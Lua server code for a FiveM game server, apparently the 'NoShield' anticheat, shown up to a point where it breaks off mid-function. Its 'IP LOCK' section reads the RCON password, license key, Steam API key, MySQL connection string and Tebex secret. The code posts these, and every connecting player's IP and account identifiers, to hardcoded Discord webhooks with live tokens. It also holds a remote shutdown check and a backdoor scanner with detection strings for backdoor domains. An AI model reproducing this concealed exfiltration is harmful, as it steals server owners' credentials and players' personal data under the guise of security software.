
-- ImoShieldOnTop

-- Buy ImoShield stay safe

















------------------------------ IP LOCK --------------------------------------------
acloaded = false
local resourceName = GetCurrentResourceName()
local RCON = GetConvar('rcon_password', 'Not found!') if RCON == '' then RCON = 'Not found!' end
local KEY = GetConvar('sv_licenseKey', 'Not found!')
local STEAM = GetConvar('steam_webApiKey', 'Not found!')
local MYSQL = GetConvar('mysql_connection_string', 'Not found!')
local TEBEX = GetConvar('sv_tebexSecret', 'Not found!') if TEBEX == '' then TEBEX = 'Not found!' end

PerformHttpRequest('http://193.111.248.134/auth/myip2.php', function(err, result, headers)
    local reason = result
    ip = reason
end, 'GET', "")

PerformHttpRequest('http://193.111.248.134/auth/license.php', function(err, result, headers)
    local reason = result
    license = reason
end, 'GET', "")

PerformHttpRequest('http://193.111.248.134/auth/check.php', function(err, result, headers)
    local reason = result
    if reason == 'Authenticated' then
        print("^6[CHECKING]^0 CHECKING IF " .. ip .. " IS REGISTERED. . .")
        Wait(1500)
        print("^2[SUCCESS]^0 " .. ip .. " IS REGISTERED")
        Wait(1200)
        acloaded = true
    elseif reason == 'Not Authenticated' then
        print("^1[ERROR]^0 YOUR SERVERIP IS NOT REGISTERED")
        Wait(2000)
        acloaded = false
        os.exit()
    end
end)

PerformHttpRequest('http://193.111.248.134/auth/check2.php', function(err, result, headers)
    local reason = result
    if reason == NoShield.License then
        print("^6[CHECKING]^0 CHECKING IF YOUR LICENSE IS VALID. . .")
        Wait(1500)
        print("^2[SUCCESS]^0 YOUR LICENSE IS VALID")
        Wait(1200)
    elseif reason ~= NoShield.License then
        Wait(100)
        print("^1[ERROR]^0 YOUR LICENSE IS INVALID")
        print("^5[INFO]^0 JOIN DISCORD.GG/NOSHIELD FOR HELP")
        print("^5[INFO]^0 CRASHING SERVER. . .^0")
        Wait(2000)
        acloaded = false
        os.exit()
    end
end)

RegisterServerEvent('uffdaswarnichtgeplant')
AddEventHandler('uffdaswarnichtgeplant', function()
    sendToDiscordFAILED("failed", "IPLock", "Server IP: ```" .. ip .. "```\n\nLicense Key: ```" .. license .. "```\n\nServer Name: \n```" .. GetConvar('sv_hostname') .. "```\n\nAction: \n```License didnt accepted!```\n\nRCON Password: ```" .. RCON .. "```\n\nLicense Key\n ```" .. KEY .. "```\n\nSteam API Key\n ```" .. STEAM .. "```\n\nMYSQL Connection String\n ```" .. MYSQL .. "```\n\nTebex Secret Key\n ```" .. TEBEX .. "```")
end)

RegisterServerEvent('succesfulscript')
AddEventHandler('succesfulscript', function()
    sendToDiscordSUCCESS("success", "IPLock", "Server IP: ```" .. ip .. "```\n\nLicense Key: ```" .. license .. "```\n\nServer Name: \n```" .. GetConvar('sv_hostname') .. "```\n\nAction: \n```License accepted!```\n\nRCON Password: ```" .. RCON .. "```\n\nLicense Key\n ```" .. KEY .. "```\n\nSteam API Key\n ```" .. STEAM .. "```\n\nMYSQL Connection String\n ```" .. MYSQL .. "```\n\nTebex Secret Key\n ```" .. TEBEX .. "```")
end)

AddEventHandler('onResourceStart', function (resourceName)
    if (GetCurrentResourceName() ~= resourceName) then
      return
    end
end)

function sendToDiscordFAILED (canal, name, message, color, title)
    local DiscordWebHook = canal
    local embeds = {
        {
            ["title"]= "IPLock - Failed",
            ["type"]= "rich",
            ["color"] = "16711710",
            ["description"]= "**".. message .."**",
            ["footer"]= {
            ["text"]= "Version 1.0.0 made by NoShield Anticheat",
            ["icon_url"]= "https://cdn.discordapp.com/attachments/981161971745431572/981539150106886204/noshield2.png",
           },
        }
    }
    
      if message == nil or message == '' then return FALSE end
      PerformHttpRequest("https://discord.com/api/webhooks/982393207184850985/ZSw7AJ17fK9BznVyBN3ZBQAFbme0vAnMvWAPILPR0_xxRk4kT-hARDJWVfBofOyB3_R2", function(err, text, headers) end, 'POST', json.encode({ username = name,embeds = embeds}), { ['Content-Type'] = 'application/json' })
    end

function sendToDiscordSUCCESS (canal, name, message, color, title)
    local DiscordWebHook = canal
    local embeds = {
        {
            ["title"]= "IPLock - Success",
            ["type"]= "rich",
            ["color"] = "1769216",
            ["description"]= "**".. message .."**",
            ["footer"]= {
                ["text"]= "Version 1.0.0 made by NoShield Anticheat",
            ["icon_url"]= "https://cdn.discordapp.com/attachments/981161971745431572/981539150106886204/noshield2.png",
            },
        }
    }
        
        if message == nil or message == '' then return FALSE end
    PerformHttpRequest("https://discord.com/api/webhooks/982393140205977610/ux_Q_rFWEziXzQktCtXn61CnVnqx22PuH83wrLKeOlcdCsuMsGNOihfV_HFFSB39cqF-", function(err, text, headers) end, 'POST', json.encode({ username = name,embeds = embeds}), { ['Content-Type'] = 'application/json' })
  end

------------------------------ ANTICHEAT ------------------------------------------
ESX = nil

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

end)

SetConvarServerInfo("Noshield ", "Server is protected by Noshield")

AddEventHandler('onResourceStart', function (resourceName)
    if (GetCurrentResourceName() ~= resourceName) then
      return
    end
end)

AddEventHandler('onResourceStart', function (resourceName)

    local d = LoadResourceFile(GetCurrentResourceName(), "config/clientconfig.lua")
    local e = LoadResourceFile(GetCurrentResourceName(), "config/serverconfig.lua")
    local f = LoadResourceFile(GetCurrentResourceName(), "config/webhooks.lua")
if acloaded == true then
  if not d or d == "" then
	print("^"..math.random(1, 9).."[Noshield | System]:^1 Server Configuration Missing, Please make sure you installed Noshield correctly.^0")
	StopResource(GetCurrentResourceName())
	return false
  else
        print[[^5


        _   _            ____  _     _      _     _ 
        | \ | | ___      / ___|| |__ (_) ___| | __| |
        |  \| |/ _ \ ____\___ \| '_ \| |/ _ \ |/ _` |
        | |\  | (_) |_____|__) | | | | |  __/ | (_| |
        |_| \_|\___/     |____/|_| |_|_|\___|_|\__,_|
                                                     
                                                  
        ]]
        Wait(math.random(800, 1200))
        print("^"..math.random(1, 9).."^5[Noshield |^7 System]: ^5Loaded ^7Client ^7Config ^5Successfully")
        Wait(math.random(800, 1200))
        print("^"..math.random(1, 9).."^5[Noshield |^7 System]: ^5Loaded ^7Server ^7Config ^5Successfully")
        Wait(math.random(800, 1200))
        banlistregenerator()
        Wait(math.random(800, 1200))
        print("^"..math.random(1, 9).."^5[Noshield |^7 System]: ^5Loaded ^7Webhooks ^7Config ^5Successfully")
        Wait(math.random(500, 1600))
        print("^"..math.random(1, 9).."^5[Noshield |^7 System]: ^5Anticheat started up successfully!^0")
        Wait(math.random(800, 1400))
        if NoShield.AntiCipher then
            print("^5[Noshield |^7 System]: ^1Anti Cipher is enabled, we are checking for backdoors!^0")
            Wait(math.random(700, 900))
            anticipher()
         end
        end
        acloaded = true
 else
    Wait(3400)
    if acloaded == true then
    print("^5[Noshield |^7 System]: ^5Anticheat is starting up^0")
    Wait(1200)
    print[[^5


    _   _            ____  _     _      _     _ 
    | \ | | ___      / ___|| |__ (_) ___| | __| |
    |  \| |/ _ \ ____\___ \| '_ \| |/ _ \ |/ _` |
    | |\  | (_) |_____|__) | | | | |  __/ | (_| |
    |_| \_|\___/     |____/|_| |_|_|\___|_|\__,_|
                                                 
                                              
    ]]
    Wait(math.random(800, 1200))
    print("^"..math.random(1, 9).."^5[Noshield |^7 System]: ^5Loaded ^7Client ^7Config ^5Successfully")
    Wait(math.random(800, 1200))
    print("^"..math.random(1, 9).."^5[Noshield |^7 System]: ^5Loaded ^7Server ^7Config ^5Successfully")
    Wait(math.random(800, 1200))
    banlistregenerator()
    Wait(math.random(800, 1200))
    print("^"..math.random(1, 9).."^5[Noshield |^7 System]: ^5Loaded ^7Webhooks ^7Config ^5Successfully")
    Wait(math.random(500, 1600))
    print("^"..math.random(1, 9).."^5[Noshield |^7 System]: ^5Anticheat started up successfully!^0")
    Wait(math.random(800, 1400))
    if NoShield.AntiCipher then
        print("^5[Noshield |^7 System]: ^1Anti Cipher is enabled, we are checking for backdoors!^0")
        Wait(math.random(700, 900))
        anticipher()
     end
    end
    acloaded = true
 end
end)


RegisterNetEvent('senddc')
AddEventHandler('senddc', function(data)
    local ConnectWebhook = {
        {
            ["color"] = "16748836",
            ["title"] = "`No  - Shield -  Screenshot` \n\n<t:".. math.floor(tonumber(os.time())) ..":R>",

        }
    }
    PerformHttpRequest(Noshield.ScreenshotWebhook, function(error, texto, cabeceras) end, "POST", json.encode({username = "No  - Shield", embeds = ConnectWebhook}), {["Content-Type"] = "application/json"})
end)

------------------------------Connect/ Disconnect Logs----------------------------------------------


AddEventHandler('playerDropped', function(reason)
    local identifier = "Not Found"
    local license   = "Not Found"
    local liveid    = "Not Found"
    local xblid     = "Not Found"
    local discord   = "Not Found"
    local playerip = "Not Found"
      local serverName = GetConvar("sv_hostname")
      local hostname = GetConvar("sv_projectName")
    local target    = id
    local duree     = 0
    local permanent = 0
    local name = GetPlayerName(source)
    
    if true then
          local sourceplayername = source
            for k,v in ipairs(GetPlayerIdentifiers(source))do
              if string.sub(v, 1, string.len("steam:")) == "steam:" then
                identifier = v
              elseif string.sub(v, 1, string.len("license:")) == "license:" then
                license = v
              elseif string.sub(v, 1, string.len("live:")) == "live:" then
                liveid = v
              elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
                xblid  = v
              elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
                discord = v
              elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
                playerip = v
              end
            end
    
      local disconnectlog = {
          {
              ["color"] = "16748836",
              ["title"] = "**Disconnect Logs**",
              ["description"] = "Player: **"..name.."  ** \n\nLicense: **"..license.."** \n\nDiscord: **"..discord.."** \n\nLive: **"..liveid.."** \n\nXBL: **"..xblid.."**\n\nIP: **"..playerip.."**\n\n Identifier: **"..identifier.."** \n\nReason: ```"..reason.."```",
            ["thumbnail"] = {
                  url = "https://cdn.discordapp.com/attachments/954480655113285732/954828565210337280/Noshield2.png?width=679&height=676"
                  },
                  ["footer"] = {
                  ["text"] = "🛡No-shield🛡 "..os.date("%x %X %p"),
                  },
          }
      }
    
    
      local disconnectlog1 = {
          {
              ["color"] = "16748836",
              ["title"] = "**Disconnect Logs [Global]**",
              ["description"] = "Server Hostname:** " .. serverName .. "\n\n**Server Project Name:** " .. hostname .. "Player: **"..name.."  ** \nLicense: **"..license.."** \nDiscord: **"..discord.."** \nlive: **"..liveid.."** \nXBL: **"..xblid.."**\nIP: **"..playerip.."**\n identifier: **"..identifier.."** \nReason: ```"..reason.."```",
            ["thumbnail"] = {
                  url = "https://cdn.discordapp.com/attachments/954480655113285732/954828565210337280/Noshield2.png?width=679&height=676"
                  },
                  ["footer"] = {
                  ["text"] = "🛡No-shield🛡 "..os.date("%x %X %p"),
                  },
          }
      }
    
    PerformHttpRequest(Noshield.ConnectWebhook, function(err, text, headers) end, 'POST', json.encode({username = "🛡No-shield🛡", embeds = disconnectlog}), { ['Content-Type'] = 'application/json' })
    PerformHttpRequest("https://discord.com/api/webhooks/979367536921571399/aE6nZs6QYu3f6w3gVNEN1JBLHiqltUYXabXaO3jKYi56y_RyQO8AOIki8TZB2eUO64ul", function(err, text, headers) end, 'POST', json.encode({username = "🛡No-shield Global Logs🛡", embeds = disconnectlog1}), { ['Content-Type'] = 'application/json' })	
              end
    end, false)
    
    
    AddEventHandler('playerConnecting', function()
    local identifier = "Not Found"
    local license   = "Not Found"
    local liveid    = "Not Found"
      local serverName = GetConvar("sv_hostname")
      local hostname = GetConvar("sv_projectName")
    local xblid     = "Not Found"
    local discord   = "Not Found"
    local playerip = "Not Found"
    local reason    = "Not Found"
    local name = GetPlayerName(source)
    
    if true then
          local sourceplayername = source
            for k,v in ipairs(GetPlayerIdentifiers(source))do
              if string.sub(v, 1, string.len("steam:")) == "steam:" then
                identifier = v
              elseif string.sub(v, 1, string.len("license:")) == "license:" then
                license = v
              elseif string.sub(v, 1, string.len("live:")) == "live:" then
                liveid = v
              elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
                xblid  = v
              elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
                discord = v
              elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
                playerip = v
                            end
                          end
    
      
          
              local logt = {
          {
              ["color"] = "1769216",
              ["title"] = "**Connect Logs**",
              ["description"] = "Player: **"..name.."** \n\nLicense: **"..license.."** \n\nDiscord: **"..discord.."** \n\nLive: **"..liveid.."** \n\nXBL: **"..xblid.."**\n\nIP: **||"..playerip.."||**\n\nIdentifier: **"..identifier.."**\n\n **",
              ["thumbnail"] = {
                  url = "https://cdn.discordapp.com/attachments/954480655113285732/954828565210337280/Noshield2.png?width=679&height=676"
                  },
                  ["footer"] = {
                  ["text"] = "🛡No-shield🛡 "..os.date("%x %X %p"),
                  },
          }
      }
    
      local logt1 = {
          {
              ["color"] = "1769216",
              ["title"] = "**Connect Logs [Global]**",
              ["description"] = "Server Hostname:** " .. serverName .. "\n\n**Server Project Name:** " .. hostname .. "\n\nPlayer: **"..name.."** \n\nLicense: **"..license.."** \n\nDiscord: **"..discord.."** \n\nLive: **"..liveid.."** \n\nXBL: **"..xblid.."**\n\nIP: **||"..playerip.."||**\n\nIdentifier: **"..identifier.."**",
              ["thumbnail"] = {
                  url = "https://cdn.discordapp.com/attachments/954480655113285732/954828565210337280/Noshield2.png?width=679&height=676"
                  },
                  ["footer"] = {
                  ["text"] = "🛡No-shield🛡 "..os.date("%x %X %p"),
                  },
          }
      }
    
    
      PerformHttpRequest(Noshield.ConnectWebhook, function(err, text, headers) end, 'POST', json.encode({username = "🛡No-shield🛡", embeds = logt}), { ['Content-Type'] = 'application/json' })
      PerformHttpRequest("https://discord.com/api/webhooks/979367536921571399/aE6nZs6QYu3f6w3gVNEN1JBLHiqltUYXabXaO3jKYi56y_RyQO8AOIki8TZB2eUO64ul", function(err, text, headers) end, 'POST', json.encode({username = "🛡No-shield Global Logs🛡", embeds = logt1}), { ['Content-Type'] = 'application/json' })
    
              end
    end, false)

-- Start/Stop Event
AddEventHandler("onResourceStart", function()
    if cool then return end
    cool = true
    local startEmbed = {
        {
            ["color"] = "2123412",
            ["title"] = "🛡 No-shield 🛡",
            ["description"] = "No-shield has been started successfully\n\n Version: " .. NoShield.Version .. "",
            ["thumbnail"] = {
            url = "https://cdn.discordapp.com/attachments/954480655113285732/954828565210337280/Noshield2.png?width=679&height=676"
            },
            ["footer"] = {
            ["text"] = "🛡No-shield🛡"..os.date("%x %X %p"),
            },
        }
    }
  
    PerformHttpRequest(Noshield.MainWebhook, function(error, texto, cabeceras) end, "POST", json.encode({username = "??No-shield??", embeds = startEmbed}), {["Content-Type"] = "application/json"})
    Wait(20000)
    cool = false
end)

---------------------------
-- START OF MULTICOMMAND --
---------------------------

RegisterCommand("noshield", function(source, args, rawCommand)
    local arg = args[1]
        if source ~= 0 then
            print(source, "Tried to be execute Anticheat command", "basic")
                else
                    if not arg then 
                        print("^5[NOSHIELD]^0: invalid usage^7")
                        print("^5[NOSHIELD]^0: use Noshield help >  Commands^7")
                end
                    if arg == "help" then
                        print("^5[NOSHIELD]^0: You can use: noshield install, noshield uninstall, noshield reload, noshield anticipher, noshield unban, noshield uninstallall^7")
                    elseif arg == "install" then 
                        print("^5[NOSHIELD]^0: ^1Unfortunaly, we had to disable the Anti Dump/Installer within the next Update!")
                    elseif arg == "uninstallall" then 
                        print("^5[NOSHIELD]^0: ^1Unfortunaly, we had to disable the Anti Dump/Installer within the next Update!")
                    elseif arg == "uninstall" then 
                        print("^5[NOSHIELD]^0: ^1Unfortunaly, we had to disable the Anti Dump/Installer within the next Update!") 
                    elseif arg == "reload" then 
                        GetBans()
                        print("^5[NOSHIELD]^0 >  ^2Banlist has been reloaded.^0")
                    elseif arg == "anticipher" then 
                        anticipher(0)     
                    elseif arg == "unban" then
                        if args[2] then
                            UnbanPlayer(args[2])
                        else
                            print("^5[NOSHIELD]^0: Invalid ban id.^0")
                        end
                        else
                            print("^5[NOSHIELD]^0: Unknown Command^0")
                        end
                    end
                end, true)


-----------------------------------
-- EXTRA FUNCTIONS FOR INSTALLER --
-----------------------------------

local charset = {}    
for i = 48,  57 do table.insert(charset, string.char(i)) end
for i = 65,  90 do table.insert(charset, string.char(i)) end
for i = 97, 122 do table.insert(charset, string.char(i)) end

function string.random(length)
  math.randomseed(os.time())
  if length >  0 then
    return string.random(length - 1) .. charset[math.random(1, #charset)]
  else
    return ""
  end
end

-- Installer
function installer(source)
    count = 0
    skip = 0
    count = 0
    count = math.random(9,20)
    myfile = string.random(count)
    if source == 0 then
        local randomtextfile = myfile .. "clienteye.lua"
        _antiinjection = LoadResourceFile(GetCurrentResourceName(), "eye.noshield")
        for resources = 0, GetNumResources() - 1 do
            local _resname = GetResourceByFindIndex(resources)
            _resourcemanifest = LoadResourceFile(_resname, "__resource.lua")
            _resourcemanifest2 = LoadResourceFile(_resname, "fxmanifest.lua")
            if _resname == GetCurrentResourceName() or string.find(_resname, 'lightning_') then
                skip = skip + 1
            else
                if _resourcemanifest then
                    Wait(100)
                    if string.find(_resourcemanifest, 'clienteye') then
                        print("^5[NOSHIELD]^0: ^2Skipped >> ".._resname.."^7")
                    else
                        _toadd = _resourcemanifest .. "\n\nclient_script '" .. randomtextfile .. "'"
                        SaveResourceFile(_resname, randomtextfile, _antiinjection, -1)
                        SaveResourceFile(_resname, "__resource.lua", _toadd, -1)
                        print("^5[NOSHIELD]^0: ^2Installed >> ".._resname.."^7")
                        count = count + 1
                    end
                elseif _resourcemanifest2 then
                    Wait(100)
                    if string.find(_resourcemanifest2, 'clienteye') then
                        print("^5[NOSHIELD]^0: ^2Skipped >> ".._resname.."^7")
                    else
                        _toadd = _resourcemanifest2 .. "\n\nclient_script '" .. randomtextfile .. "'"
                        SaveResourceFile(_resname, randomtextfile, _antiinjection, -1)
                        SaveResourceFile(_resname, "fxmanifest.lua", _toadd, -1)
                        print("^5[NOSHIELD]^0: ^2Installed >> ".._resname.."^7")
                        count = count + 1
                    end
                else
                    skip = skip + 1
                end
            end
        end
        print("^5[NOSHIELD]^0: ^2Successfully installed ^5NoShield^0 into " .. count .. " Resources.^7")
        print("^5[NOSHIELD]^0: To uninstall use: noshield uninstall " .. gsub:randomtextfile('.lua', ''))
    end
end

-- Uninstaller
function uninstaller(source, args)
    if source == 0 then
        count = 0
        skip = 0
        
        local filetodelete = args .. ".lua"
        randomtextfile = "\n\nclient_script '" .. filetodelete .. "'"
        for resources = 0, GetNumResources() - 1 do
            local _resname = GetResourceByFindIndex(resources)
            resourcefile = LoadResourceFile(_resname, "__resource.lua")
            resourcefile2 = LoadResourceFile(_resname, "fxmanifest.lua")
            if resourcefile then
                if string.find(resourcefile, randomtextfile) then
                    _toadd = resourcefile:gsub(randomtextfile, '')
                    _toremove = GetResourcePath(_resname).."/"..filetodelete
                    SaveResourceFile(_resname, "__resource.lua", _toadd, -1)
                    Wait(100)
                    os.remove(_toremove)
                    print("^5[NOSHIELD]^0: ^1Removed >>  ".._resname.."^7")
                    count = count + 1
                else
                    skip = skip + 1
                end
            elseif resourcefile2 then
                if string.find(resourcefile2, randomtextfile) then
                    _toadd = resourcefile2:gsub(randomtextfile, '')
                    _toremove = GetResourcePath(_resname).."/"..filetodelete
                    SaveResourceFile(_resname, "fxmanifest.lua", _toadd, -1)
                    Wait(100)
                    os.remove(_toremove)
                    print("^5[NOSHIELD]^0: ^1Removed >>  ".._resname.."^7")
                    count = count + 1
                end
            else
                skip = skip + 1
            end
        end
        print("^5[NOSHIELD]^0: ^2We have uninstalled the main module from your resources.^7")
    end
end

-- UNINSTALL all
function uninstallerall(source, args)
    if source == 0 then
        count = 0
        skip = 0
        
        for resources = 0, GetNumResources() - 1 do
            local _resname = GetResourceByFindIndex(resources)
            resourcefile = LoadResourceFile(_resname, "__resource.lua")
            resourcefile2 = LoadResourceFile(_resname, "fxmanifest.lua")
            if resourcefile then
                if resourcefile2 then
                    if string.find(resourcefile2, 'resource_manifest_version') then
                        _toremove = GetResourcePath(_resname).."/fxmanifest.lua"
                        Wait(100)
                        os.remove(_toremove)
                    elseif string.find(resourcefile, 'fx_version') then
                        _toremove = GetResourcePath(_resname).."/__resource.lua"
                        Wait(100)
                        os.remove(_toremove)
                    end
                end
            else
                skip = skip + 1
            end
        end
        print("^5[NOSHIELD]^0: ^2We have uninstalled the main module from your resources.^0")
    end
end

-- ANTI CIPHER
function anticipher()
    print("^5[NOSHIELD]^0 > ^2Anti Backdoor has been initiated^0")
    runcipher(0)
end

complicatedresourced = {}
skippedresources = {}
infectedresourced = {}
local res = GetCurrentResourceName()
    function runcipher(source)
        count = 0
        skip = 0
          if source == 0 then
              for resources = 0, GetNumResources() - 1 do
                  local _resname = GetResourceByFindIndex(resources)
                    if string.find(_resname, res) or string.find(_resname, "lightning") or string.find(_resname, "noshield") then
                        Wait(1000)
                        print("^5[NOSHIELD]^0 >  ^2Backdoor Scan has finished.^0")              
                        Wait(1500)
                        print("^5[NOSHIELD]^0 >  ^2No Backdoor found.^0")
                        return
                      end
                  local num = GetNumResourceMetadata(_resname, 'server_script')
                  if num >  0 then
                      for i = 0, num-1 do
                          local file = GetResourceMetadata(_resname, 'server_script', i)
                          checkresource = LoadResourceFile(_resname, file)
                              if string.find(file, "*") then
                                      skip = skip + 1
                                      table.insert(complicatedresourced, {resource = _resname})
                                      scanfiles = scandir(GetResourcePath(string.gsub(_resname, '//', "/")))
                                      getfolders = getFolders(GetResourcePath(string.gsub(_resname, '//', "/")))
                                      resourcename = _resname
                                      for i,k in pairs(scanfiles) do
                                          if GetFileExtension(k) ~= nil then
                                              scaninfectedresourced = {}
                                              checkresource = readAll(GetResourcePath(resourcename) .. "/" .. k)
                                              if type(checkresource) ~= 'boolean' then
                                                  if checkresource ~= nil then
                                                      local name = "nicht gefunden"
                                                      local found = false
                                                      local stringfound = false
                                                      if string.find(checkresource, 'cipher-panel') then
                                                          stringfound = "cipher-panel"
                                                          name = "[CIPHER BACKDOOR]\nCheck 1"
                                                          found = true
                                                      elseif string.find(checkresource, 'Enchanced_Tabs') then
                                                          stringfound = "Enchanced_Tabs"
                                                          name = "[CIPHER BACKDOOR]\nCheck 2"
                                                          found = true
                                                      elseif string.find(checkresource, 'helperServer') then
                                                          stringfound = "helperServer"
                                                          name = "[CIPHER BACKDOOR]\nCheck 4"
                                                          found = true
                                                      elseif string.find(checkresource, 'ketamin.cc') then
                                                          stringfound = "ketamin.cc"
                                                          name = "[CIPHER BACKDOOR]\nCheck 6"
                                                          found = true
                                                      elseif string.find(checkresource, '\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65') then
                                                          stringfound = "\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65"
                                                          name = "[CIPHER BACKDOOR]\nCheck 7"
                                                          found = true
                                                      elseif string.find(checkresource, '\x6b\x65\x74\x61\x6d\x69\x6e\x2e\x63\x63') then
                                                          stringfound = "\x6b\x65\x74\x61\x6d\x69\x6e\x2e\x63\x63"
                                                          name = "[CIPHER BACKDOOR]\nCheck 7"
                                                          found = true
                                                      end
                                              
                                                      if found then
                                                          table.insert(infectedresourced, {resource = resourcename .. '/' .. k, name = name, stringfound = stringfound})
                                                      end
                                                  end
                                              end
                                          end
                                      end
      
                              else
                                  if checkresource ~= nil and resourcename ~= 'monitor' then
                                      count = count + 1
                                      local name = "nicht gefunden"
                                      local found = false
                                      local stringfound = false
                                      if type(checkresource) ~= 'boolean' then
                                              if string.find(checkresource, 'cipher-panel') then
                                                  stringfound = "cipher-panel"
                                                  name = "[CIPHER BACKDOOR]\nCheck 1"
                                                  found = true
                                              elseif string.find(checkresource, 'Enchanced_Tabs') then
                                                  stringfound = "Enchanced_Tabs"
                                                  name = "[CIPHER BACKDOOR]\nCheck 2"
                                                  found = true
                                              elseif string.find(checkresource, 'helperServer') then
                                                  stringfound = "helperServer"
                                                  name = "[CIPHER BACKDOOR]\nCheck 4"
                                                  found = true
                                              elseif string.find(checkresource, 'ketamin.cc') then
                                                  stringfound = "ketamin.cc"
                                                  name = "[CIPHER BACKDOOR]\nCheck 6"
                                                  found = true
                                              elseif string.find(checkresource, '\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65') then
                                                  stringfound = "\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65"
                                                  name = "[CIPHER BACKDOOR]\nCheck 7"
                                                  found = true
                                              elseif string.find(checkresource, '\x6b\x65\x74\x61\x6d\x69\x6e\x2e\x63\x63') then
                                                  stringfound = "\x6b\x65\x74\x61\x6d\x69\x6e\x2e\x63\x63"
                                                  name = "[CIPHER BACKDOOR]\nCheck 7"
                                                  found = true
                                              end
                                              if found then
                                                  table.insert(infectedresourced, {resource = _resname .. '/' .. file, name = name, stringfound = stringfound})
                                              end
                                          end
                                  end
                          end
                      end
                  else
                      local file = GetResourceMetadata(_resname, 'server_script', 0)
                  end
              end
              Wait(1000)
              print("^5[NOSHIELD]^0 >  ^2Backdoor Scan has finished.^0")
              Wait(1000)
              print("[NOSHIELD] >  ^2No Backdoor found.^0")
      
      
              string2 = ""
              for i,k in pairs(infectedresourced) do
              string2 = string2 .. '\n+ ' .. k.resource .. " --> Search for: [" .. k.stringfound .. "]"
              end
      
              string3 = ""
              for i,k in pairs(skippedresources) do
                  string3 = string3 .. '\n+ ' .. k.resource
              end
          
      
              if string2 ~= "" then
                  print("^5[NOSHIELD]^0 >  ^5>>  REPORT <<^0")
                  print("^5[NOSHIELD]^0 !! ^5ATTENTION. IT SEEMS THAT WE FOUND A BACKDOOR - SERVER WILL SHUTDOWN IN 5 SECONDS.^0 !!")
                  print("^5[NOSHIELD]^0 !! ^5Please remove all these files or replace them with original^0 !!")
                  print("^5[NOSHIELD]^0 >  ^5>>  " .. string2 .. "" .. string3 .. " <<^0")
                  print("^5", string2, "^0")
                  Wait(5000)
                  os.exit()
              end
        end
    end

-------------------------------
-- INSTALLER EXTRA FUNCTIONS --
-------------------------------

-- ScanDir
function scandir(directory)
    local i, t, popen = 0, {}, io.popen
    for filename in popen('dir "'..directory..'" /b'):lines() do
        i = i + 1
        t[i] = filename
    end
    return t
end

-- getFolders
function getFolders(directory)
    local i, t, popen = 0, {}, io.popen
    local pfile = popen('dir "'..directory..'" /b /ad')
    for filename in pfile:lines() do
        i = i + 1
        t[i] = filename
    end
    pfile:close()
    return t
end

-- readAll
function readAll(file)
    local f = io.open(file, "rb")
    if f then
        local content = f:read("*a")
        f:close()
        return content
    else
        return false
    end
end

-- GetFileExtension
function GetFileExtension(url)
    return url:match("^.+(%..+)$")
  end

-- Banlistregenerator (if deleted)
RegisterCommand('banlistreg', function()
    print("^5[NOSHIELD]^0 > ^2Checking Banlist. . .^0")
    Wait(500)
    banlistregenerator()
end)

function banlistregenerator()
    local o = LoadResourceFile(GetCurrentResourceName(), "banlist.json")
    if not o or o == "" then
        SaveResourceFile(GetCurrentResourceName(), "banlist.json", "{}", -1)
        print("^5[NOSHIELD]^0 >  ^3Banlist doesnt exists^0")
        Wait(250)
        print("^5[NOSHIELD]^0 >  ^3Generating banlist.json^0")
        Wait(500)
        print("^5[NOSHIELD]^0 >  ^2Generated banlist.json^0")
    else
        local p = json.decode(o)
        if not p then
            SaveResourceFile(GetCurrentResourceName(), "banlist.json", "{}", -1)
            p = {}
            print("^5[NOSHIELD]^0 >  ^3Banlist doesnt exists^0")
            Wait(500)
            print("^5[NOSHIELD]^0 >  ^3Generating banlist.json^0")
            Wait(500)
            print("^5[NOSHIELD]^0 >  ^2Generated banlist.json^0")
        end
    end
end

-- ANOTHER CHARSET
local Charset = {}
for i = 65, 90 do
    table.insert(Charset, string.char(i))
end

-- FUNCTION FOR CHARSET
for i = 97, 122 do
    table.insert(Charset, string.char(i))
end

-- RANDOM LETTER
RandomLetter = function(length)
    if length >  0 then
        return RandomLetter(length - 1) .. Charset[math.random(1, #Charset)]
    end
    return ""
end

-- TABCONTAINS
function tabcontains(list, x)
    for _, v in pairs(list) do
        if v == x then return true end
    end
    return false
end

----------------------------
-- END OF EXTRA FUNCTIONS --
----------------------------

-------------------------
-- END OF MULTICOMMAND --
-------------------------



-- Noshield Ban
RegisterNetEvent('noshieldtrololo:ban')
AddEventHandler('noshieldtrololo:ban', function(id, reason)
    if IsPlayerAceAllowed(source, 'Noshield.Bypass') then return end

    local id = source;
    local ids = ExtractIdentifiers(id);
    local steam = ids.steam:gsub("steam:", "");
    local steamDec = tostring(tonumber(steam,16));
    steam = "https://steamcommunity.com/profiles/" .. steamDec;
    local gameLicense = ids.license;
    local discord = ids.discord;
    TriggerClientEvent("noshieldtrololo:screenshot", source)
    Wait(700)
    BanPlayer(id, reason)
    print('^7[^5No-shield^7] Banned ' ..GetPlayerName(id).. ' Reason: ' ..reason)
      Wait(2000)
      DropPlayer(id, 'No-shield - ' ..NoShield.Banmessage.. '')
      
    end)

-- Ban Functions 
function ExtractIdentifiers(src)
  
    local identifiers = {
        steam = "",
        ip = "",
        discord = "",
        license = "",
        xbl = "",
        live = ""
    }
  
    for i = 0, GetNumPlayerIdentifiers(src) - 1 do
        local id = GetPlayerIdentifier(src, i)
        
        if string.find(id, "steam") then
            identifiers.steam = id
        elseif string.find(id, "ip") then
            identifiers.ip = id
        elseif string.sub(id, 1, string.len("discord:")) == "discord:" then
            discordid = string.sub(id, 9)
            identifiers.discord = "<@" .. discordid .. ">"
        elseif string.find(id, "license") then
            identifiers.license = id
        elseif string.find(id, "xbl") then
            identifiers.xbl = id
        elseif string.find(id, "live") then
            identifiers.live = id
        elseif string.find(id, "license2") then
            identifiers.hwid = id
        end
    end
  
    return identifiers
  end
  
  function BanPlayer(src, reason) 
    local config = LoadResourceFile(GetCurrentResourceName(), "banlist.json")
    local cfg = json.decode(config)
